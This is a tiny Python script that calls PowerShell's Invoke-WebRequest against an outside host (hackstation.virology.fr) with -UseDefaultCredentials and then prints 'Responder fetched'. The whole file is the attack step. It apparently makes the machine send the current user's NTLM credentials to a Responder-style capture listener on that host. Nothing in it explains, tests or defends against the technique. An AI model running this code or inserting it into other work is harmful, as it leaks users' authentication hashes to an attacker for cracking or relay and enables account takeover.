def main():
    import subprocess

    ps_command = "Invoke-WebRequest -uri http://hackstation.virology.fr -UseDefaultCredentials"

    subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)

    print("Responder fetched")

main()